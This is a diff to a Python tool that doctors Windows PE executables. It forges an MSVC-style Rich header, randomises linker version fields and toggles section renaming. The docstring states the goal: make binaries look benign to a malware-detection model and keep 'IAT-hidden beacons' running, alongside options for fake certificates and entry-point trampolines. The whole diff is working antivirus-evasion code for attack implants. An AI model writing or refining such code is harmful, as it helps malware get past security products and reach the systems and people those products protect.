@@ -300,35 +300,87 @@ def modify_section_names(data):
     return data, renamed
 
 # ─────────────────────────────────────────────────────────────
-# Feature 3: Rich Header corruption (preserved from original)
+# Feature 3: Rich Header injection (replaces the old corruption)
 # ─────────────────────────────────────────────────────────────
 
-def corrupt_rich_header(data):
+def inject_valid_rich_header(data):
     """
-    Corrupt the Rich Header (DanS format).
-    XOR key is usually the first DWORD and XORs the entire structure.
-    By XORing with a wrong key, most PE parsers will fail to extract it.
+    Inject a valid MSVC-style Rich header (DanS format) into the DOS stub.
+
+    A valid Rich header makes the PE look compiled by MSVC, which is what
+    QVM 2.0 expects from benign binaries. Having no Rich header (the
+    clang/mingw default) or a corrupted one (the old XOR-0xFF approach)
+    are both anomalies the model flags.
+
+    The Rich header is written into the DOS stub region starting at offset
+    0x40, overwriting the legacy "This program cannot be run in DOS mode"
+    stub message. The stub is never executed on Windows, so overwriting it
+    is safe. NO file shifting is performed — an earlier version shifted the
+    PE signature to make room, but that broke IAT-hidden beacons at runtime
+    (access violation at the entry point): the loader/beacon interaction is
+    sensitive to PE header layout changes, and shifting — even with every
+    file-offset field updated and section data preserved byte-for-byte —
+    caused a consistent crash. Writing into the existing DOS stub avoids
+    this entirely.
+
+    Rich header layout (DWORDs, little-endian):
+      DanS(XOR) (CompId Count)(XOR) ... Rich  key  key
+    - DanS = 0x536E6144 (start marker, XORed with key)
+    - Rich = 0x68636952 (end marker, NOT XORed)
+    - key stored twice after Rich (NOT XORed) for validation
+    - everything from DanS up to (not including) Rich is XORed with key
+    - CompId = (build << 16) | prodid
     """
     locs = decode_pe_locations(data)
     if locs is None:
         return data, 0
 
     e_lfanew = locs['e_lfanew']
-    rich_sig = b"Rich"
-    pos = 0
-    corrupted = 0
 
-    while pos < e_lfanew:
-        pos = data.find(rich_sig, pos, e_lfanew)
-        if pos == -1:
-            break
-        # XOR the Rich marker with 0xFF to corrupt it
-        for i in range(4):
-            data[pos + i] ^= 0xFF
-        corrupted += 1
-        pos += 4
+    # If a Rich header already exists, leave it alone (don't double-inject).
+    if b"Rich" in data[0x40:e_lfanew]:
+        return data, 0
 
-    return data, corrupted
+    # VS 2019 (14.29.30133, build 30133) toolchain — real CompId/Count pairs.
+    build = 30133  # 0x75B5
+    pairs = [
+        ((build << 16) | 0x0003, 0x0000000C),  # Linker,       12 invocations
+        ((build << 16) | 0x0001, 0x0000001E),  # Cvtomf,       30 invocations
+        ((build << 16) | 0x0009, 0x00000002),  # C compiler,    2 invocations
+        ((build << 16) | 0x0006, 0x00000005),  # C++ compiler,  5 invocations
+    ]
+
+    DANS = 0x536E6144
+    RICH = 0x68636952
+    key = random.randint(1, 0xFFFFFFFF)
+
+    pre_dwords = [DANS]
+    for compid, count in pairs:
+        pre_dwords.append(compid)
+        pre_dwords.append(count)
+
+    block = bytearray()
+    for d in pre_dwords:
+        block += struct.pack('<I', d)
+    block += struct.pack('<I', RICH)
+    block += struct.pack('<I', key)
+    block += struct.pack('<I', key)
+
+    # XOR everything before "Rich" with the key.
+    rich_off_in_block = len(pre_dwords) * 4
+    for i in range(0, rich_off_in_block, 4):
+        v = struct.unpack_from('<I', block, i)[0]
+        struct.pack_into('<I', block, i, v ^ key)
+
+    # Write into the DOS stub at 0x40 (overwrites the legacy stub message,
+    # which is never executed on Windows). Must fit before e_lfanew.
+    stub_start = 0x40
+    if stub_start + len(block) > e_lfanew:
+        # Not enough room in the DOS stub — skip rather than risk a broken PE.
+        return data, 0
+
+    data[stub_start:stub_start + len(block)] = block
+    return data, 1
 
 # ─────────────────────────────────────────────────────────────
 # Feature 4: Checksum calculation and writing
@@ -670,8 +722,8 @@ def normalize_optional_header(data):
         (14, 39), (14, 40),
     ]
     major_linker, minor_linker = random.choice(msvc_versions)
-    normalizations.append(('MajorLinkerVersion', opt_hdr_off + 8, major_linker, 1))
-    normalizations.append(('MinorLinkerVersion', opt_hdr_off + 9, minor_linker, 1))
+    data[opt_hdr_off + 8] = major_linker
+    data[opt_hdr_off + 9] = minor_linker
 
     # --- SizeOfCode (offset 12 from opt hdr, 4 bytes) ---
     # We'll leave this as-is since fixing it requires matching code sections
@@ -1273,6 +1325,8 @@ Examples:
                         help='Add empty .rsrc, .reloc, .tls sections')
     parser.add_argument('--no-fake-sections', action='store_true',
                         help='Disable fake section injection')
+    parser.add_argument('--no-rename-sections', action='store_true',
+                        help='Disable section name randomization (recommended: random names on a multi-section mingw binary are an anomaly)')
     parser.add_argument('--normalize', action='store_true', default=True,
                         help='Normalize optional header fields')
     parser.add_argument('--no-normalize', action='store_true',
@@ -1318,6 +1372,7 @@ Examples:
 
     # Resolve feature toggles
     do_fake_sections = args.add_fake_sections and not args.no_fake_sections
+    do_rename_sections = not args.no_rename_sections
     do_normalize = args.normalize and not args.no_normalize
     do_ep_trampoline = args.ep_trampoline and not args.no_ep_trampoline
     do_fake_cert = args.fake_cert and not args.no_fake_cert
@@ -1359,20 +1414,23 @@ Examples:
         print(f"[1/10] [!] TimeDateStamp: not modified (not a valid PE?)")
 
     # 2. Rename sections
-    data, renamed = modify_section_names(data)
+    if do_rename_sections:
+        data, renamed = modify_section_names(data)
+    else:
+        renamed = 0
     if renamed:
         print(f"[2/10] [+] Section names: {renamed} sections renamed")
         changes_applied += 1
     else:
         print(f"[2/10] [-] Section names: none renamed")
 
-    # 3. Corrupt Rich Header
-    data, rich_corrupted = corrupt_rich_header(data)
-    if rich_corrupted:
-        print(f"[3/10] [+] Rich Header: {rich_corrupted} signature(s) corrupted")
+    # 3. Inject valid Rich Header
+    data, rich_injected = inject_valid_rich_header(data)
+    if rich_injected:
+        print(f"[3/10] [+] Rich Header: valid MSVC-style header injected")
         changes_applied += 1
     else:
-        print(f"[3/10] [-] Rich Header: none found (or already clean)")
+        print(f"[3/10] [-] Rich Header: skipped (no room / not enough header slack)")
 
     # 4. Checksum calculation
     if do_checksum:
